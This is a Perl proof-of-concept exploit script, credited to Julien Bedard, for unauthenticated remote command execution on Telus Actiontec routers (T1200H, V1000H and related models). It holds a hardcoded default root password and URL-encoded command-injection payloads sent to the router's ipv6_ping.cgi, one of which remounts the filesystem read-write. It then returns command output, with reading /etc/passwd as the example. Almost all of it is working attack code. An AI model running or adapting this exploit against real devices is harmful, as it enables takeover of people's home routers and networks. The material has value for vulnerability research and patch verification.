#/usr/bin/perl

# Exploit Title: Telus Actiontec T1200H Router Remote command Execution
# Date: January 19, 2017
# Exploit Author: Julien Bedard
# Vendor Homepage: https://www.actiontec.com , https://www.telus.com
# Software Link: http://opensource.actiontec.com
# Version: V1000H, V2000H, T1200H, T2200H and T3200M Routers
# Tested on: Confirmed on All Firwmware versions with help of Telus Security Labs


#
# First thanks for http://telussecuritylabs.com who confirmed the vulnerability
# in all router equipments and for quick and fast reply and remediation.
#
# Second this exploit is a very quick version made to Proof the vulnerability
# is fully working.
#
# No login required as it's hardcoded and valid for all versions and firmware tested
#
# Julien Bedard - https://www.upwork.com/freelancers/~01d2249087c907f120
# Other exploits: https://www.exploit-db.com/author/?a=1416
#

use LWP::UserAgent;

$cmd = $ARGV[0];

print <<EOF;
               _ _       \\ \
    .-"""""-. / \\_> /\\    |/
   /         \\.'`  `',.--//
 -(    BUG    I      I  @@\
   \\         /'.____.'\\___|
    '-.....-' __/ | \\   (`)
             /   /  /
                 \\  \

   Telus Actiontec T1200H RCE
        By Julien Bedard 
                                                                                                                                                                   
EOF

if($cmd eq '')
{
  die "[!] You must specify a command to execute\n  exemple: perl actiontec_t1200h_rce.pl 'cat /etc/passwd'\n\n";
}

$cmd .= '+2%3E%261+%3E+%2Fwebs%2Fjs%2Foutfile.js'; # Add output for web server readable results
$cmd =~ s/\s/\+/g; #replace space by +

my $login_url = "http://192.168.1.254:80/login.cgi";
my $vulnerable_url = "http://192.168.1.254:80/ipv6_ping.cgi";
my $output_url = "http://192.168.1.254:80/js/outfile.js";


my $ua = LWP::UserAgent->new;


print "[+] Login with root credentials\n";
# login with default root password (work with T1200H-31.128L.05)
my $req = HTTP::Request->new(POST => $login_url);
$req->header('Referer' => 'http://192.168.1.254/');
$req->header('Content-Type' => 'application/x-www-form-urlencoded');
my $post_data = 'inputUserName=root&inputPassword=t%60xgbu&nothankyou=1';

$req->content($post_data);
my $resp = $ua->request($req);

print "[+] Mount filesystem as read / write\n";
# Mount filesystem as read / write
my $req = HTTP::Request->new(POST => $vulnerable_url);
$req->header('Referer' => 'http://192.168.1.254/ipv6_ping.html');
$req->header('Content-Type' => 'application/x-www-form-urlencoded');
my $post_data = 'ipv6_hostName=%3Bmount+-t+jffs2+-o+remount%2Crw+mtd%3Arootfs%3Bgoogle.ca&ipv6_pingSign=1&ipv6_packetSize=32&ipv6_pingNum=4&nothankyou=1&ipv6_interfaceName=N';
$req->content($post_data);
my $resp = $ua->request($req);

print "[+] Send command Payload\n";
# Send the command payload
my $req = HTTP::Request->new(POST => $vulnerable_url);
$req->header('Referer' => 'http://192.168.1.254/ipv6_ping.html');
$req->header('Content-Type' => 'application/x-www-form-urlencoded');
my $post_data = 'ipv6_hostName=%3B'. $cmd . '%3Bgoogle.ca&ipv6_pingSign=1&ipv6_packetSize=32&ipv6_pingNum=4&nothankyou=1&ipv6_interfaceName=N';
$req->content($post_data);
my $resp = $ua->request($req);


# Get the response
sleep(1); # sleep 1 second to let the time of the command to finish executing, this can take more time so adjust to your needs.
my $req = HTTP::Request->new(GET => $output_url);
 
my $resp = $ua->request($req);
if ($resp->is_success) {
    $message = $resp->decoded_content;
    print "Received reply:\n$message\n\n";
}

if($message eq '')
{
  print "[i] Verify that the command can be output or manually verify the file $output_url\n\n";
}

